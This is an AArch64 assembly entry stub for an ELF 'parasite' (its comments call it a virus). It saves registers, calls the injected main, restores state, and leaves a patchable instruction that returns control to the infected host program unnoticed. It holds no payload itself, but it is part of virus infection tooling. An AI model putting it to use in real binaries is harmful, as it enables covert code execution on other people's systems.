/*
When the parasite finishes execution, we need to restore the original stack
frame as if nothing happened before. In order to support all redirection method
the startup script is engineered in a way that maybe saves more registers than
necessary. The original libc entry point is here:

https://github.com/bminor/glibc/blob/master/sysdeps/aarch64/start.S

We could support support forwarding arc/arg/envp to virus but due to lack of
use case, and complexity to make it work cross platform (x86-64 redirection
is more complicated), we don't do it. Which makes this script way smaller
and generic for all redirection methods. If users do want to forward them,
it must be done with great care.
*/

/* use a custom linker script to make sure this is the first in text. */
.section .text.start_parasite 
.global _start
_start:

/* .inst 0xd4200000 */

stp x0, x1, [sp, #-16]!
stp x2, x3, [sp, #-16]!
stp x4, x5, [sp, #-16]!
stp x6, x7, [sp, #-16]!
stp x29, x30, [sp, #-16]!

bl main

ldp x29, x30, [sp], #16     /* restore x0 */
ldp x6, x7, [sp], #16       /* restore x0 */
ldp x4, x5, [sp], #16       /* restore x0 */
ldp x2, x3, [sp], #16       /* restore x0 */
ldp x0, x1, [sp], #16       /* restore x0 */

/* offset from _start is 44 */
.global _patch_return
_patch_return:
.inst 0x11223344            /* to be patched */